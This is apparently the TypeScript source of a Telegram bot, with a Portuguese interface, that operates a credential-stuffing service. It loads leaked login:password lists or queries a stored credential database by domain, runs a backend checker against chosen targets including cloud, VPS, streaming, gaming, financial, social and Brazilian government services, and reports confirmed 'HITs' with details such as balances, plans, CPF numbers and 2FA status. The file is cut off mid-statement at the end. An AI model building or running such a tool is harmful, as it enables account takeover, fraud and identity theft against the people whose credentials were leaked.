import { Telegraf, Markup, type Context } from "telegraf";
import { message } from "telegraf/filters";
import { BOT_TOKEN, API_BASE, CHECKER_TARGETS, MINIAPP_URL } from "./config.js";

if (!BOT_TOKEN) {
  console.error("❌ TELEGRAM_BOT_TOKEN não configurado.");
  process.exit(1);
}

const bot = new Telegraf(BOT_TOKEN);

// ── Types ─────────────────────────────────────────────────────────────────────
interface Session {
  credentials?: string[];
  activeJobId?: string;
  hits:         HitEntry[];
  fails:        string[];
  errors:       string[];
  running:      boolean;
  progressMsgId?: number;
  progressChatId?: number;
  abortCtrl?:   AbortController;
  waitingFor?:  "file" | "domain" | null;
  currentLabel?: string;
}

interface HitEntry {
  credential: string;
  detail:     string;
  target:     string;
  at:         number;
}

const sessions = new Map<number, Session>();
function getSession(userId: number): Session {
  if (!sessions.has(userId)) {
    sessions.set(userId, { hits: [], fails: [], errors: [], running: false });
  }
  return sessions.get(userId)!;
}

// ── HTML escape ───────────────────────────────────────────────────────────────
function esc(s: string) {
  return s.replace(/[&<>"']/g, c =>
    ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]!));
}

// ── Theme constants ───────────────────────────────────────────────────────────
const LINE  = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━";
const LINE2 = "────────────────────────────";
const GEASS = "👁";
const SWORD = "⚔️";

// ── Parse checker detail string ───────────────────────────────────────────────
// Detail format examples:
//   "email:x@y.com | plano:premium | país:BR | 2fa:true | repos:42"
//   "saldo:$4.20 | nome:John Doe | desde:2020-01-01"
//   "credenciais_invalidas" (plain error)
interface ParsedDetail {
  pairs: { key: string; value: string }[];
  raw:   string;
}

function parseDetail(raw: string): ParsedDetail {
  const pairs: { key: string; value: string }[] = [];
  const parts = raw.split("|").map(p => p.trim()).filter(Boolean);
  for (const part of parts) {
    const colonIdx = part.indexOf(":");
    if (colonIdx > 0) {
      const key   = part.slice(0, colonIdx).trim();
      const value = part.slice(colonIdx + 1).trim();
      pairs.push({ key, value });
    } else {
      pairs.push({ key: "info", value: part });
    }
  }
  return { pairs, raw };
}

// Map raw key names to pretty labels + emojis
const KEY_LABELS: Record<string, string> = {
  email:       "📧 E-mail",
  login:       "👤 Login",
  nome:        "👤 Nome",
  name:        "👤 Nome",
  plano:       "⭐ Plano",
  plan:        "⭐ Plano",
  tier:        "⭐ Tier",
  país:        "🌍 País",
  country:     "🌍 País",
  saldo:       "💰 Saldo",
  balance:     "💰 Saldo",
  "2fa":       "🔒 2FA",
  mfa:         "🔒 2FA",
  repos:       "📁 Repos",
  gists:       "📝 Gists",
  stars:       "⭐ Stars",
  uid:         "🆔 UID",
  id:          "🆔 ID",
  user_id:     "🆔 ID",
  desde:       "📅 Criado",
  created:     "📅 Criado",
  since:       "📅 Desde",
  expires:     "📅 Expira",
  servers:     "🖥️ Servidores",
  vps:         "🖥️ VPS",
  instances:   "🖥️ Instâncias",
  regions:     "🗺️ Regiões",
  spend:       "💸 Gasto",
  credits:     "💳 Créditos",
  billing:     "💳 Cobrança",
  rank:        "🏆 Rank",
  level:       "📊 Nível",
  robux:       "💎 Robux",
  wallet:      "👛 Carteira",
  games:       "🎮 Jogos",
  followers:   "👥 Seguidores",
  following:   "👥 Seguindo",
  username:    "🏷️ Username",
  account_id:  "🆔 Conta",
  scopes:      "🔑 Escopos",
  tipo:        "📋 Tipo",
  info:        "ℹ️ Info",
  cpf:         "🪪 CPF",
  cnpj:        "🪪 CNPJ",
  dob:         "🎂 Nasc.",
  nascimento:  "🎂 Nasc.",
  owner:       "👤 Owner",
  org:         "🏢 Org",
};

function prettyKey(k: string): string {
  return KEY_LABELS[k.toLowerCase()] ?? `📌 ${k}`;
}

// ── Build individual HIT card (blockquote style) ──────────────────────────────
function buildHitCard(hit: HitEntry): string {
  const [login, ...rest] = hit.credential.split(":");
  const password = rest.join(":");
  const d = parseDetail(hit.detail);
  const ts = new Date(hit.at).toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" });

  const lines: string[] = [];

  // Credential line
  lines.push(`🔑 <code>${esc(login ?? hit.credential)}</code>`);
  if (password && password !== hit.detail) {
    lines.push(`🗝️ <code>${esc(password)}</code>`);
  }

  // Detail pairs
  if (d.pairs.length > 0) {
    lines.push(LINE2);
    for (const { key, value } of d.pairs) {
      const label = prettyKey(key);
      const displayVal = value.length > 60 ? value.slice(0, 57) + "..." : value;
      lines.push(`${label}: <b>${esc(displayVal)}</b>`);
    }
  }

  lines.push(LINE2);
  lines.push(`🎯 <b>${esc(hit.target.toUpperCase())}</b>  ·  🕐 ${ts}`);

  return [
    `✅ <b>HIT CONFIRMADO</b>`,
    `<blockquote>${lines.join("\n")}</blockquote>`,
  ].join("\n");
}

// ── Build progress bar ────────────────────────────────────────────────────────
function buildBar(pct: number, size = 14): string {
  const filled = Math.round((pct / 100) * size);
  return `<code>${"█".repeat(filled)}${"░".repeat(size - filled)}</code>`;
}

// ── Build progress message ────────────────────────────────────────────────────
function buildProgress(
  label: string,
  total: number,
  done: number,
  hits: HitEntry[],
  fails: string[],
  errors: string[],
): string {
  const pct = total > 0 ? Math.round((done / total) * 100) : 0;
  const spd = done > 0 ? `${done}/${total}` : `0/${total}`;
  const lines = [
    `${GEASS} <b>OPERAÇÃO EM CURSO</b> ${GEASS}`,
    `<b>Alvo:</b> <code>${esc(label.toUpperCase())}</code>`,
    LINE2,
    `${buildBar(pct)} <b>${pct}%</b>  <code>${spd}</code>`,
    ``,
    `✅ <b>HITs</b>   <code>${hits.length}</code>   ❌ <b>FAILs</b> <code>${fails.length}</code>   ⚡ <b>Erros</b> <code>${errors.length}</code>`,
  ];
  if (hits.length > 0) {
    lines.push(``);
    lines.push(`<b>🎯 Últimos HITs:</b>`);
    hits.slice(-3).forEach(h => {
      const [login] = h.credential.split(":");
      lines.push(`  <code>${esc(login ?? h.credential)}</code>`);
    });
  }
  lines.push(LINE);
  return lines.join("\n");
}

// ── Build final report ────────────────────────────────────────────────────────
function buildFinal(
  label: string,
  total: number,
  hits: HitEntry[],
  fails: string[],
  errors: string[],
  stopped = false,
): string {
  const hitRate = total > 0 ? ((hits.length / total) * 100).toFixed(1) : "0.0";
  const lines = [
    stopped
      ? `🛑 <b>GEASS SUSPENSO</b>`
      : `✅ <b>GEASS CONCLUÍDO</b>`,
    `<code>${esc(label.toUpperCase())}</code>`,
    LINE2,
    `📊 Total: <b>${total}</b>  ·  Taxa HIT: <b>${hitRate}%</b>`,
    ``,
    `✅ HITs:  <b>${hits.length}</b>   ❌ FAILs: <b>${fails.length}</b>   ⚡ Erros: <b>${errors.length}</b>`,
  ];
  if (hits.length > 0) {
    lines.push(``);
    lines.push(`<b>🎯 Primeiros HITs:</b>`);
    hits.slice(0, 5).forEach(h => {
      const [login] = h.credential.split(":");
      const d = parseDetail(h.detail);
      const planPair = d.pairs.find(p => ["plano", "plan", "tier"].includes(p.key.toLowerCase()));
      const suffix = planPair ? ` · <i>${esc(planPair.value)}</i>` : "";
      lines.push(`  <code>${esc(login ?? h.credential)}</code>${suffix}`);
    });
  }
  lines.push(``);
  lines.push(LINE);
  if (hits.length > 0) {
    lines.push(`<i>Use os botões abaixo para ver todos os HITs.</i>`);
  }
  return lines.join("\n");
}

// ── Session status ────────────────────────────────────────────────────────────
function sessionStatusMsg(s: Session): string {
  const credCount = s.credentials?.length ?? 0;
  return [
    `${GEASS} <b>STATUS DA SESSÃO</b>`,
    LINE2,
    ``,
    `🔑 Credenciais: <b>${credCount.toLocaleString("pt-BR")}</b>`,
    `⚙️ Checker: <b>${s.running ? `🟢 ATIVO — ${esc(s.currentLabel ?? "")}` : "🔴 Parado"}</b>`,
    ``,
    `✅ HITs:   <b>${s.hits.length}</b>`,
    `❌ FAILs:  <b>${s.fails.length}</b>`,
    `⚡ Erros:  <b>${s.errors.length}</b>`,
    ``,
    LINE,
  ].join("\n");
}

// ── Edit helper ───────────────────────────────────────────────────────────────
async function editMsg(
  ctx: Context,
  chatId: number,
  msgId: number,
  text: string,
  extra?: Parameters<typeof ctx.telegram.editMessageText>[4],
) {
  try {
    await ctx.telegram.editMessageText(chatId, msgId, undefined, text, {
      parse_mode: "HTML",
      ...extra,
    });
  } catch { /* ignore edit conflicts */ }
}

// ── Home screen ───────────────────────────────────────────────────────────────
function homeMsg(name: string): string {
  return [
    `${GEASS} <b>GEASS COMMAND CENTER</b> ${GEASS}`,
    `<i>All hail Lelouch vi Britannia</i>`,
    LINE2,
    ``,
    `Bem-vindo, <b>${esc(name)}</b>.`,
    `O poder do Geass responde às suas ordens.`,
    ``,
    LINE,
    `${SWORD} Escolha sua operação abaixo.`,
  ].join("\n");
}

function homeKeyboard() {
  const rows = [
    [
      Markup.button.callback(`${SWORD} Checar Creds`,  "home_checker"),
      Markup.button.callback("🔍 Buscar Domínio",      "home_url"),
    ],
    [
      Markup.button.callback("📊 Stats do Banco",      "home_stats"),
      Markup.button.callback("🎯 Ver HITs",            "home_hits"),
    ],
    [
      Markup.button.callback("📋 Status Sessão",       "home_status"),
      Markup.button.callback("🗑 Limpar Sessão",       "home_clear"),
    ],
  ];
  if (MINIAPP_URL) {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    rows.push([Markup.button.webApp("📲 Abrir Painel Geass", MINIAPP_URL)] as any);
  }
  return Markup.inlineKeyboard(rows);
}

// ── Target menu keyboard ──────────────────────────────────────────────────────
// Groups targets by category, 2 per row, with a header "button" for each cat.
function buildTargetKeyboard() {
  const cats: Record<string, { id: string; label: string }[]> = {};
  CHECKER_TARGETS.forEach(t => { (cats[t.cat] ??= []).push({ id: t.id, label: t.label }); });

  const catEmoji: Record<string, string> = {
    "Dev / Cloud":   "☁️",
    "VPS / Hosting": "🖥️",
    "Streaming":     "🎬",
    "Gaming":        "🎮",
    "Financeiro":    "💳",
    "Social":        "📱",
    "Governo BR":    "🏛️",
  };

  const rows: ReturnType<typeof Markup.button.callback>[][] = [];

  Object.entries(cats).forEach(([cat, targets]) => {
    // Category header — non-interactive (callback answers empty)
    rows.push([
      Markup.button.callback(`${catEmoji[cat] ?? "▸"} ${cat.toUpperCase()}`, `cat_noop_${cat}`),
    ]);
    // Targets: 2 per row
    for (let i = 0; i < targets.length; i += 2) {
      const pair = targets.slice(i, i + 2).map(t => Markup.button.callback(t.label, `target_${t.id}`));
      rows.push(pair);
    }
  });

  rows.push([Markup.button.callback("↩ Cancelar", "go_home")]);
  return Markup.inlineKeyboard(rows);
}

async function showTargetMenu(ctx: Context, count: number, domain?: string) {
  await ctx.replyWithHTML(
    [
      `${SWORD} <b>ESCOLHA O ALVO</b>`,
      LINE2,
      domain ? `🔍 Domínio: <code>${esc(domain)}</code>` : null,
      `📋 <b>${count.toLocaleString("pt-BR")}</b> credenciais prontas`,
      LINE,
    ].filter(Boolean).join("\n"),
    buildTargetKeyboard(),
  );
}

// ── Category noop handler ─────────────────────────────────────────────────────
bot.action(/^cat_noop_/, async ctx => {
  await ctx.answerCbQuery();
});

// ── /start ────────────────────────────────────────────────────────────────────
bot.start(async ctx => {
  const name = ctx.from?.first_name ?? "Operador";
  await ctx.replyWithHTML(homeMsg(name), homeKeyboard());
});

bot.command("home", async ctx => {
  const name = ctx.from?.first_name ?? "Operador";
  await ctx.replyWithHTML(homeMsg(name), homeKeyboard());
});

// ── /help ─────────────────────────────────────────────────────────────────────
bot.command("help", async ctx => {
  await ctx.replyWithHTML([
    `${GEASS} <b>ORDENS DO GEASS</b>`,
    LINE2,
    ``,
    `<b>🔧 Controle:</b>`,
    `/start    — Painel principal`,
    `/status   — Status da sessão`,
    `/stop     — Parar checker ativo`,
    `/clear    — Limpar sessão`,
    ``,
    `<b>${SWORD} Checker:</b>`,
    `/checker  — Iniciar checker (envie .txt)`,
    `/url &lt;domínio&gt; — Buscar no banco e checar`,
    `/import   — Importar credenciais para o banco`,
    ``,
    `<b>📊 Resultados:</b>`,
    `/hits     — Ver HITs da sessão`,
    `/fails    — Ver FAILs da sessão`,
    `/errors   — Ver erros da sessão`,
    `/stats    — Estatísticas do banco`,
    ``,
    LINE,
    `<i>💡 Envie um .txt com <code>login:senha</code> por linha para carregar credenciais.</i>`,
  ].join("\n"), Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]));
});

// ── /stats ────────────────────────────────────────────────────────────────────
bot.command("stats",     async ctx => { await showStats(ctx); });
bot.action("home_stats", async ctx => { await ctx.answerCbQuery(); await showStats(ctx); });

async function showStats(ctx: Context) {
  try {
    const r    = await fetch(`${API_BASE}/api/credentials/stats`);
    const data = await r.json() as { total: number; topDomains: { domain: string; count: number }[] };
    const domains = (data.topDomains ?? []).slice(0, 8)
      .map((d, i) => `  ${i + 1}. <code>${esc(d.domain)}</code> — <b>${d.count}</b>`)
      .join("\n");
    await ctx.replyWithHTML([
      `${GEASS} <b>BANCO DE CREDENCIAIS</b>`,
      LINE2,
      ``,
      `📦 Total: <b>${data.total.toLocaleString("pt-BR")}</b> credenciais`,
      ``,
      `<b>🔝 Top Domínios:</b>`,
      domains || `  <i>Nenhum ainda</i>`,
      ``,
      LINE,
    ].join("\n"), Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]));
  } catch (e) {
    await ctx.reply(`❌ Erro: ${String(e)}`);
  }
}

// ── /hits ─────────────────────────────────────────────────────────────────────
bot.command("hits",     async ctx => { await showHits(ctx, getSession(ctx.from!.id)); });
bot.action("home_hits", async ctx => { await ctx.answerCbQuery(); await showHits(ctx, getSession(ctx.from!.id)); });

async function showHits(ctx: Context, s: Session) {
  if (s.hits.length === 0) {
    await ctx.replyWithHTML(
      `${GEASS} <b>HITs</b>\n${LINE2}\n\n<i>Nenhum HIT ainda nesta sessão.</i>\n${LINE}`,
      Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]),
    );
    return;
  }

  const preview = s.hits.slice(0, 30).map(h => {
    const [login] = h.credential.split(":");
    const d = parseDetail(h.detail);
    const planPair = d.pairs.find(p => ["plano", "plan", "tier"].includes(p.key.toLowerCase()));
    const extra = planPair ? ` · ${esc(planPair.value)}` : (d.pairs[0] ? ` · ${esc(d.pairs[0].value)}` : "");
    return `✅ <code>${esc(login ?? h.credential)}</code>${extra}`;
  }).join("\n");

  await ctx.replyWithHTML(
    [
      `✅ <b>HITs (${s.hits.length})</b>`,
      LINE2,
      ``,
      preview,
      s.hits.length > 30 ? `\n<i>... e mais ${s.hits.length - 30} HITs</i>` : "",
      ``,
      LINE,
    ].join("\n"),
    Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]),
  );
}

// ── /fails ────────────────────────────────────────────────────────────────────
bot.command("fails", async ctx => {
  const s = getSession(ctx.from!.id);
  if (s.fails.length === 0) { await ctx.reply("Nenhum FAIL na sessão atual."); return; }
  const text = s.fails.slice(0, 50).map(f => `❌ <code>${esc(f)}</code>`).join("\n");
  await ctx.replyWithHTML(
    `❌ <b>FAILs (${s.fails.length})</b>\n${LINE2}\n\n${text}`,
    Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]),
  );
});

// ── /errors ───────────────────────────────────────────────────────────────────
bot.command("errors", async ctx => {
  const s = getSession(ctx.from!.id);
  if (s.errors.length === 0) { await ctx.reply("Nenhum erro na sessão atual."); return; }
  const text = s.errors.slice(0, 50).map(e => `⚡ <code>${esc(e)}</code>`).join("\n");
  await ctx.replyWithHTML(
    `⚡ <b>Erros (${s.errors.length})</b>\n${LINE2}\n\n${text}`,
    Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]),
  );
});

// ── /status ───────────────────────────────────────────────────────────────────
bot.command("status",    async ctx => { const s = getSession(ctx.from!.id); await ctx.replyWithHTML(sessionStatusMsg(s), Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]])); });
bot.action("home_status",async ctx => { await ctx.answerCbQuery(); const s = getSession(ctx.from!.id); await ctx.replyWithHTML(sessionStatusMsg(s), Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]])); });

// ── /clear ────────────────────────────────────────────────────────────────────
bot.command("clear",    async ctx => { await doClear(ctx, getSession(ctx.from!.id)); });
bot.action("home_clear", async ctx => {
  await ctx.answerCbQuery();
  const s = getSession(ctx.from!.id);
  if (s.running) { await ctx.answerCbQuery("⚠️ Pare o checker primeiro!"); return; }
  await doClear(ctx, s);
});

async function doClear(ctx: Context, s: Session) {
  if (s.running) { await ctx.reply("⚠️ Pare o checker antes de limpar (/stop)."); return; }
  s.credentials = undefined;
  s.hits = []; s.fails = []; s.errors = [];
  s.activeJobId = undefined; s.waitingFor = null; s.currentLabel = undefined;
  await ctx.replyWithHTML(
    `🗑 <b>SESSÃO LIMPA</b>\n${LINE2}\n\nCredenciais e resultados apagados.\n${LINE}`,
    Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]),
  );
}

// ── /stop ─────────────────────────────────────────────────────────────────────
bot.command("stop", async ctx => {
  const s = getSession(ctx.from!.id);
  if (!s.running) { await ctx.reply("Nenhum checker ativo."); return; }
  await stopChecker(ctx, s, true);
});

bot.action("stop_checker", async ctx => {
  await ctx.answerCbQuery("🛑 Parando...");
  const s = getSession(ctx.from!.id);
  if (!s.running) return;
  await stopChecker(ctx, s, true);
});

async function stopChecker(ctx: Context, s: Session, byUser = false) {
  s.abortCtrl?.abort("user_stop");
  s.running = false;
  if (s.activeJobId) {
    await fetch(`${API_BASE}/api/checker/${s.activeJobId}`, { method: "DELETE" }).catch(() => {});
  }
  if (s.progressChatId && s.progressMsgId) {
    const total = s.hits.length + s.fails.length + s.errors.length;
    const text  = buildFinal(s.currentLabel ?? "checker", total, s.hits, s.fails, s.errors, byUser);
    await editMsg(ctx, s.progressChatId, s.progressMsgId, text,
      Markup.inlineKeyboard([
        [Markup.button.callback("✅ Ver HITs", "home_hits"), Markup.button.callback("📊 Stats", "home_stats")],
        [Markup.button.callback("🏠 Início",   "go_home")],
      ]),
    );
  }
}

// ── /import ───────────────────────────────────────────────────────────────────
bot.command("import", async ctx => {
  const s = getSession(ctx.from!.id);
  s.waitingFor = "file";
  await ctx.replyWithHTML(
    `💾 <b>IMPORTAR CREDENCIAIS</b>\n${LINE2}\n\nEnvie um arquivo <b>.txt</b> com credenciais\n(<code>login:senha</code> por linha).`,
    Markup.inlineKeyboard([[Markup.button.callback("↩ Cancelar", "go_home")]]),
  );
});

// ── /checker ──────────────────────────────────────────────────────────────────
bot.command("checker", async ctx => {
  const s = getSession(ctx.from!.id);
  if (s.running) { await ctx.reply("⚠️ Já existe um checker ativo. Use /stop primeiro."); return; }
  if (s.credentials?.length) {
    await showTargetMenu(ctx, s.credentials.length);
  } else {
    s.waitingFor = "file";
    await ctx.replyWithHTML(
      `${SWORD} <b>GEASS CHECKER</b>\n${LINE2}\n\nEnvie um arquivo <b>.txt</b> com credenciais\n(<code>login:senha</code> por linha).`,
      Markup.inlineKeyboard([[Markup.button.callback("↩ Cancelar", "go_home")]]),
    );
  }
});

// ── /url ──────────────────────────────────────────────────────────────────────
bot.command("url", async ctx => {
  const args = ctx.message.text.split(/\s+/).slice(1);
  if (!args[0]) { await ctx.reply("Uso: /url <domínio>  (ex: /url github.com)"); return; }
  await searchAndOffer(ctx, args[0]);
});

bot.action("home_url", async ctx => {
  await ctx.answerCbQuery();
  const s = getSession(ctx.from!.id);
  s.waitingFor = "domain";
  await ctx.replyWithHTML(
    `🔍 <b>BUSCAR DOMÍNIO</b>\n${LINE2}\n\nEnvie o domínio para buscar no banco:\n<i>ex: github.com, netflix.com</i>`,
    Markup.inlineKeyboard([[Markup.button.callback("↩ Cancelar", "go_home")]]),
  );
});

async function searchAndOffer(ctx: Context, domain: string) {
  const waitMsg = await ctx.replyWithHTML(`🔍 <b>Buscando</b> <code>${esc(domain)}</code>...`);
  try {
    const r    = await fetch(`${API_BASE}/api/credentials/search?domain=${encodeURIComponent(domain)}&limit=500`);
    const data = await r.json() as { count: number; credentials: { login: string; password: string }[] };
    if (data.count === 0) {
      await editMsg(ctx, waitMsg.chat.id, waitMsg.message_id,
        `🔍 <b>BUSCA — ${esc(domain)}</b>\n${LINE2}\n\n<i>Nenhuma credencial encontrada no banco.</i>\n${LINE}`,
        Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]),
      );
      return;
    }
    const creds = data.credentials.map(c => `${c.login}:${c.password}`);
    const s = getSession(ctx.from!.id);
    s.credentials = creds;
    await editMsg(ctx, waitMsg.chat.id, waitMsg.message_id,
      `🔍 <b>${esc(domain.toUpperCase())}</b>\n${LINE2}\n\n✅ <b>${data.count}</b> credenciais encontradas!\n${LINE}`,
    );
    await showTargetMenu(ctx, creds.length, domain);
  } catch (e) {
    await editMsg(ctx, waitMsg.chat.id, waitMsg.message_id, `❌ Erro: ${String(e)}`);
  }
}

// ── Home callback ─────────────────────────────────────────────────────────────
bot.action("go_home", async ctx => {
  await ctx.answerCbQuery();
  const name = ctx.from?.first_name ?? "Operador";
  await ctx.replyWithHTML(homeMsg(name), homeKeyboard());
});

bot.action("home_checker", async ctx => {
  await ctx.answerCbQuery();
  const s = getSession(ctx.from!.id);
  if (s.running) { await ctx.replyWithHTML("⚠️ Já existe um checker ativo. Use /stop primeiro."); return; }
  if (s.credentials?.length) {
    await showTargetMenu(ctx, s.credentials.length);
  } else {
    s.waitingFor = "file";
    await ctx.replyWithHTML(
      `${SWORD} <b>GEASS CHECKER</b>\n${LINE2}\n\nEnvie um arquivo <b>.txt</b>\n(<code>login:senha</code> por linha).`,
      Markup.inlineKeyboard([[Markup.button.callback("↩ Cancelar", "go_home")]]),
    );
  }
});

// ── File action buttons ───────────────────────────────────────────────────────
bot.action("file_check", async ctx => {
  await ctx.answerCbQuery();
  const s = getSession(ctx.from!.id);
  if (!s.credentials?.length) { await ctx.reply("Nenhuma credencial carregada."); return; }
  await showTargetMenu(ctx, s.credentials.length);
});

bot.action("file_import", async ctx => {
  await ctx.answerCbQuery("Importando...");
  const s = getSession(ctx.from!.id);
  if (!s.credentials?.length) { await ctx.reply("Nenhuma credencial carregada."); return; }
  try {
    const r    = await fetch(`${API_BASE}/api/credentials/import?source=telegram`, {
      method: "POST",
      headers: { "Content-Type": "text/plain; charset=utf-8" },
      body: s.credentials.join("\n"),
    });
    const data = await r.json() as { inserted: number; skipped: number };
    await ctx.replyWithHTML(
      `💾 <b>IMPORTAÇÃO CONCLUÍDA</b>\n${LINE2}\n\nInserido: <b>${data.inserted}</b>\nIgnorado: <b>${data.skipped}</b>\n${LINE}`,
      Markup.inlineKeyboard([[Markup.button.callback("🏠 Início", "go_home")]]),
    );
  } catch (e) {
    await ctx.reply(`❌ Erro ao importar: ${String(e)}`);
  }
});

// ── Target callbacks ──────────────────────────────────────────────────────────
CHECKER_TARGETS.forEach(t => {
  bot.action(`target_${t.id}`, async ctx => {
    await ctx.answerCbQuery(`${SWORD} Iniciando ${t.label}...`);
    const s = getSession(ctx.from!.id);
    if (!s.credentials?.length) { await ctx.reply("Nenhuma credencial carregada."); return; }
    if (s.running) { await ctx.reply("⚠️ Pare o checker atual (/stop) primeiro."); return; }
    await startChecker(ctx, t.id, t.label, s);
  });
});

// ── File handler ──────────────────────────────────────────────────────────────
bot.on(message("document"), async ctx => {
  const doc = ctx.message.document;
  if (!doc.file_name?.match(/\.(txt|csv|log)$/i) && doc.mime_type !== "text/plain") {
    await ctx.reply("⚠️ Envie um arquivo .txt com credenciais.");
    return;
  }
  try {
    const fileLink = await ctx.telegram.getFileLink(doc.file_id);
    const raw      = await fetch(fileLink.toString()).then(r => r.text());
    const lines    = raw.split(/\r?\n/).map(l => l.trim()).filter(l => l.includes(":"));

    if (lines.length === 0) {
      await ctx.reply("❌ Nenhuma credencial válida (formato login:senha) encontrada.");
      return;
    }

    const s      = getSession(ctx.from!.id);
    s.credentials = lines;
    s.waitingFor  = null;

    await ctx.replyWithHTML(
      [
        `📄 <b>ARQUIVO RECEBIDO</b>`,
        LINE2,
        ``,
        `<b>${esc(doc.file_name ?? "arquivo.txt")}</b>`,
        `<b>${lines.length.toLocaleString("pt-BR")}</b> credenciais carregadas`,
        ``,
        LINE,
      ].join("\n"),
      Markup.inlineKeyboard([
        [Markup.button.callback(`${SWORD} Checar Agora`, "file_check"),
         Markup.button.callback("💾 Importar DB",       "file_import")],
        [Markup.button.callback("🏠 Início",             "go_home")],
      ]),
    );
  } catch (e) {
    await ctx.reply(`❌ Erro ao ler arquivo: ${String(e)}`);
  }
});

// ── Text message handler ──────────────────────────────────────────────────────
bot.on(message("text"), async ctx => {
  const text = ctx.message.text;
  if (text.startsWith("/")) return;

  const s = getSession(ctx.from!.id);

  if (s.waitingFor === "domain") {
    s.waitingFor = null;
    const domain = text.trim().replace(/^https?:\/\//i, "").split("/")[0];
    await searchAndOffer(ctx, domain);
    return;
  }

  const lines = text.split(/\r?\n/).map(l => l.trim()).filter(l => l.includes(":") && !l.startsWith("/"));
  if (lines.length >= 2) {
    s.credentials = lines;
    s.waitingFor  = null;
    await ctx.replyWithHTML(
      `📋 <b>CREDENCIAIS CARREGADAS</b>\n${LINE2}\n\n<b>${lines.length}</b> linhas detectadas\n${LINE}`,
      Markup.inlineKeyboard([
        [Markup.button.callback(`${SWORD} Checar Agora`, "file_check"),
         Markup.button.callback("💾 Importar DB",       "file_import")],
        [Markup.button.callback("🏠 Início",             "go_home")],
      ]),
    );
    return;
  }

  const trimmed = text.trim();
  if (trimmed.includes(".") && !trimmed.includes(" ") && trimmed.length < 100) {
    const domain = trimmed.replace(/^https?:\/\//i, "").split("/")[0];
    await searchAndOffer(ctx, domain);
  }
});

// ── Start checker SSE session ─────────────────────────────────────────────────
async function startChecker(ctx: Context, target: string, label: string, s: Session) {
  s.hits         = [];
  s.fails        = [];
  s.errors       = [];
  s.running      = true;
  s.currentLabel = label;

  const creds  = s.credentials!;
  const chatId = ctx.chat!.id;

  const initMsg = await ctx.replyWithHTML(
    buildProgress(label, creds.length, 0, [], [], []),
    Markup.inlineKeyboard([[Markup.button.callback("🛑 PARAR GEASS", "stop_checker")]]),
  );
  s.progressMsgId  = initMsg.message_id;
  s.progressChatId = chatId;

  let jobId: string;
  try {
    const r = await fetch(`${API_BASE}/api/checker/start`, {
      method:  "POST",
      headers: { "Content-Type": "application/json" },
      body:    JSON.stringify({ target, credentials: creds }),
    });
    if (!r.ok) throw new Error(`HTTP ${r.status}`);
    const data = await r.json() as { jobId: string };
    jobId = data.jobId;
    s.activeJobId = jobId;
  } catch (e) {
    s.running = false;
    await ctx.reply(`❌ Erro ao iniciar checker: ${String(e)}`);
    return;
  }

  const abortCtrl = new AbortController();
  s.abortCtrl = abortCtrl;

  let done            = 0;
  let lastEdit        = Date.now();
  const EDIT_INTERVAL = 4_000;

  void (async () => {
    try {
      const resp = await fetch(`${API_BASE}/api/checker/${jobId}/stream`, {
        signal: abortCtrl.signal,
      });
      if (!resp.ok || !resp.body) throw new Error(`HTTP ${resp.status}`);

      const reader  = resp.body.getReader();
      const decoder = new TextDecoder();
      let   buf     = "";

      while (true) {
        const { done: streamDone, value } = await reader.read();
        if (streamDone) break;
        buf += decoder.decode(value, { stream: true });
        const blocks = buf.split("\n\n");
        buf = blocks.pop() ?? "";

        for (const block of blocks) {
          const line = block.trim();
          if (!line.startsWith("data:")) continue;
          let data: Record<string, unknown>;
          try { data = JSON.parse(line.slice(5).trim()); } catch { continue; }

          if (data["type"] === "result") {
            done++;
            const cred   = String(data["credential"] ?? "?");
            const detail = String(data["detail"] ?? "");

            if (data["status"] === "HIT") {
              const hit: HitEntry = { credential: cred, detail, target: label, at: Date.now() };
              s.hits.push(hit);
              // ── Send individual HIT notification ──
              try {
                await ctx.telegram.sendMessage(chatId, buildHitCard(hit), { parse_mode: "HTML" });
              } catch { /* ignore notification errors */ }
            } else if (data["status"] === "FAIL") {
              s.fails.push(`${cred} | ${detail}`);
            } else {
              s.errors.push(`${cred} | ${detail}`);
            }

            const now = Date.now();
            if (now - lastEdit > EDIT_INTERVAL) {
              lastEdit = now;
              await editMsg(ctx, chatId, s.progressMsgId!,
                buildProgress(label, creds.length, done, s.hits, s.fails, s.errors),
                Markup.inlineKeyboard([[Markup.button.callback("🛑 PARAR GEASS", "stop_checker")]]),
              );
            }
          } else if (data["type"] === "done" || data["type"] === "end") {
            s.running = false;
            await sendFinalReport(ctx, chatId, s.progressMsgId!, label, creds.length, s.hits, s.fails, s.errors);
            return;
          }
        }
      }
    } catch (err) {
      if ((err as Error)?.name === "AbortError") return;
    } finally {
      if (s.running) {
        s.running = false;
        await sendFinalReport(ctx, chatId, s.progressMsgId!, label, creds.length, s.hits, s.fails, s.errors);
      }
    }
  })();
}

// ── Final report ──────────────────────────────────────────────────────────────
async function sendFinalReport(
  ctx: Context,
  chatId: number,
  msgId: number,
  label: string,
  total: number,
  hits: HitEntry[],
  fails: string[],
  errors: string[],
) {
  const text = buildFinal(label, total, hits, fails, errors, false);
  await editMsg(ctx, chatId, msgId, text,
    Markup.inlineKeyboard([
      [Markup.button.callback("✅ Ver HITs", "home_hits"), Markup.button.callback("📊 Stats", "home_stats")],
      [Markup.button.callback("🏠 Início",   "go_home")],
    ]),
  );

  if (hits.length > 5) {
    const buf = Buffer.from(
      hits.map(h => `${h.credential} | ${h.detail}`).join("\n"),
      "utf-8",
    );
    await ctx.telegram.sendDocument(chatId,
      { source: buf, filename: `hits_${label.replace(/\s+/g, "_").replace(/[^\w-]/g, "")}.txt` },
      { caption: `✅ <b>${hits.length} HITs</b> — ${esc(label)}`, parse_mode: "HTML" },
    );
  }
}

// ── Launch ────────────────────────────────────────────────────────────────────
bot.launch(() => {
  console.log("🤖 Geass Command Center bot running...");
}).catch(err => {
  const msg = String(err?.message ?? err);
